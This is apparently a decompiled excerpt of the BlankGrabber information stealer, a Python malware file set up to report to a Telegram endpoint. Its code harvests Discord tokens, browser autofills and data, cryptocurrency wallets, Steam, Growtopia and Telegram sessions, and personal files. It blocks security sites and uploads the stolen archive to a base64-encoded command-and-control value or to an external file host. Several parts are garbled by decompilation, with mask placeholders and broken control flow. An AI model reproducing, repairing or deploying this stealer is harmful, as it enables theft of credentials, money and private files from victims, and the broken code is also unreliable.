...
# Internal filename: blanker tg endpoint.py
...
class Settings:
    C2 = (1, base64.b64decode('NzM0OTMwMDIzMTpBQUVBQ3lWWFNRc2dhMFE0RVJnYVpPLXNwMnR0cnZDQi1vdyQ2MzA1MzE3NzI3').decode())
    Mutex = base64.b64decode('UVk3M3k5VGdxeld5SmhlWA==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
...
logging.basicConfig(format='[1;36m%(funcName)s[0m:[1;33m%(levelname)7s[0m:%(message)s')
...
class Utility:
    ...
    def GetRandomString(length: int=5, invisible: bool=False):
        return ''.join(random.choices([' ', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length)) if invisible else ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
    ...
    def BlockSites() -> None:
        if Utility.IsAdmin():
            ...
            newdata = []
            for i in data:
                if not any([x in i for x in BANNED_SITES]):
                    newdata.append(i)
        ...
        def GetAutofills(self) -> list[str]:
            ...
            for path in autofillsFilePaths:
                ...
                try:
                    ...
                    cursor = db.cursor()
                    try:
                        results = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]
                    except Exception:
                            for data in results:
                                data = data.strip()
...
class Discord:
    ...
    def GetTokens() -> list[dict]:
        ...
        tokens = list()
        threads = list()
        paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.LOCALAPPDATA, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Sta', 'User Data'), '7Star': os.path.join(Discord.LOCALAPPDATA, '7Star', 'User Data'), 'Sputnik':
            pass  # postinserted
...
class BlankGrabber:
            ...
            for name, dir in [('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))]:
                if os.path.isdir(dir):
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)) and (any([x in file.lower() for x in ['secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup']]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))):
                            continue
                            try:
    ...
    def StealGrowtopia(self) -> None:
        if Settings.CaptureGames:
            ...
            for index, path in enumerate(growtopiadirs):
                ...
                if multiple and (not self.GrowtopiaStolen or open(os.path.join(saveToPath, 'Info.txt'), 'w')) as file:
    ...
    def StealSteam(self) -> None:
        if Settings.CaptureGames:
            ...
            for index, steamPath in enumerate(steamPaths):
                ...
                if not os.path.isdir(steamConfigPath):
                    continue
                ...
                return (file := (file.write('Multiple Steam installations are found, so the files for each of them are put in different Profiles') if multiple else None)).write('<Code311 code object Syscalls at 0x7f52e153b190, file blanker tg endpoint.py>, line 162') if self.SteamStolen else (file := (file.write('Multiple Steam installations are found, so the files for each of them are put in different Profiles') for file in <mask_16>))
            pass
    ...
    def StealWallets(self) -> None:
        if Settings.CaptureWallets:
            ...
            wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
            browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'Opera GX': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv
    ...
    def StealBrowserData(self) -> None:
        ...
        threads = []
        paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Iridium', 'iridium', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'appdata', 'Opera Software', 'Opera Stable'),
    ...
    def StealTelegramSessions(self) -> None:
        if Settings.CaptureTelegram:
            ...
            for index, telegramPath in enumerate(telegramPaths):
                ...
                file.write('Multiple Telegram installations are found, so the files for each of them are put in different Profiles') if self.TelegramSessionsCount and (not multiple or not open(os.path.join(saveToDir, 'Info.txt'), 'w')) else self.TelegramSessionsCount:
                    pass  # postinserted
            shutil.rmtree(_saveToDir)
            failed = True
            break
    ...
    def SendData(self) -> None:
        ...
        case 0:
            ...
            if os.path.getsize(self.ArchivePath) / 1048576 > 20:
            ...
            case 1:
                ...
                if os.path.getsize(self.ArchivePath) / 1048576 > 40:
                    url = self.UploadToExternalService(self.ArchivePath, filename)
                    if url is None:
                        raise Exception('Failed to upload to external service')
                else:  # inserted
